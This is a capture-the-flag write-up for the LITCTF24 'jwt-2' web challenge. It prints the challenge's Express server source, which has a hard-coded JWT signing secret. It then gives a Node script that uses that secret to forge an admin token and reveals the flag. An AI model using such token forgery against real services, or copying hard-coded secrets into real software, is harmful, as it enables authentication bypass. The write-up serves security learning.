---
title: "LITCTF24 - Jwt 2"
date: 2024-08-13T18:49:06+01:00
tags: ["ctf", "write-up"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Jwt 2"
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/images/default-cover.jpg" # default image path/url
    alt: "CTF Write-up Cover Image" # alt text
    caption: "CTF Write-up" # display caption under cover
    relative: false
    hidden: false
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Description

```
name: jwt-2
category: web
points: 117
```

its like jwt-1 but this one is harder URL: http://litctf.org:31777/

## Solution

The description is very clear, the vulnerability should be in how the signature
is handled, but instead of no verification at all, we should expect something harder
this time.

My first hunch tells me to brute force the key used to generate the jwt token, but
we're actually given the source code.

```typescript
import express from "express";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import crypto from "crypto";

const accounts: [string, string][] = [];

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const sign = (payload: object) => {
  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
  return jwtHeader + "." + jwtPayload + "." + signature;

}

const app = express();

const port = process.env.PORT || 3000;

app.listen(port, () =>
  console.log("server up on http://localhost:" + port.toString())
);

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "site")));

app.get("/flag", (req, res) => {
  if (!req.cookies.token) {
    console.log('no auth')
    return res.status(403).send("Unauthorized");
  }

  try {
    const token = req.cookies.token;
    // split up token
    const [header, payload, signature] = token.split(".");
    if (!header || !payload || !signature) {
      return res.status(403).send("Unauthorized");
    }
    Buffer.from(header, "base64").toString();
    // decode payload
    const decodedPayload = Buffer.from(payload, "base64").toString();
    // parse payload
    const parsedPayload = JSON.parse(decodedPayload);
		// verify signature
		const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');
		if (signature !== expectedSignature) {
			return res.status(403).send('Unauthorized ;)');
		}
    // check if user is admin
    if (parsedPayload.admin || !("name" in parsedPayload)) {
      return res.send(
        fs.readFileSync(path.join(__dirname, "flag.txt"), "utf-8")
      );
    } else {
      return res.status(403).send("Unauthorized");
    }
  } catch {
    return res.status(403).send("Unauthorized");
  }
});

app.post("/login", (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).send("Bad Request");
    }
    if (
      accounts.find(
        (account) => account[0] === username && account[1] === password
      )
    ) {
      const token = sign({ name: username, admin: false });
      res.cookie("token", token);
      return res.redirect("/");
    } else {
      return res.status(403).send("Account not found");
    }
  } catch {
    return res.status(400).send("Bad Request");
  }
});


app.post('/signup', (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).send('Bad Request');
    }
    if (accounts.find(account => account[0] === username)) {
      return res.status(400).send('Bad Request');
    }
    accounts.push([username, password]);
    const token = sign({ name: username, admin: false });
    res.cookie('token', token);
    return res.redirect('/');
  } catch {
    return res.status(400).send('Bad Request');
  }
});
```

The code creates a JWT-based authentication system using a fixed secret key (`jwtSecret = "xook"`) to sign tokens.

- **Key Use:** The key `"xook"` is used in HMAC SHA-256 to create a signature for the JWT. This signature ensures that the token's integrity can be verified when it's received. If the JWT signature doesn't match the expected signature (generated using the same key), access is denied.

So as you can see, the key is given to us, we just need to extract the code that
creates a valid jwt token from the latter source code, supply the username we used
to access the website, and admin set to True. The code that does that would look something
like this:

```js
const crypto = require('crypto')

// Define the secret key used in signing
const jwtSecret = "xook";

// Function to generate JWT
const sign = (payload) => {
  // Encode the payload to base64
  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
    .toString("base64")
    .replace(/=/g, "");

  // Create the JWT header (in base64 format without '=')
  const header = Buffer.from(
    JSON.stringify({ alg: "HS256", typ: "JWT" }),
    "utf-8"
  )
    .toString("base64")
    .replace(/=/g, "");

  // Generate the HMAC SHA-256 signature
  const signature = crypto.createHmac('sha256', jwtSecret)
    .update(header + '.' + jwtPayload)
    .digest('base64')
    .replace(/=/g, '');

  // Return the full JWT token
  return header + "." + jwtPayload + "." + signature;
}

// Test payload
const testPayload = { username: "hxuu", admin: true };

// Generate a token
const token = sign(testPayload);

// Output the generated token
console.log("Generated JWT Token:", token);
```

Running the code above gives a valid token. We just have to replace the cookies given
by the application by our newly crafted token, and then pressing GET FLAG.

![flag](/blog/images/2024-08-13-19-02-45.png)

---

flag is: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`

Things learned:

* how to weak key can result into compromising jwt tokens
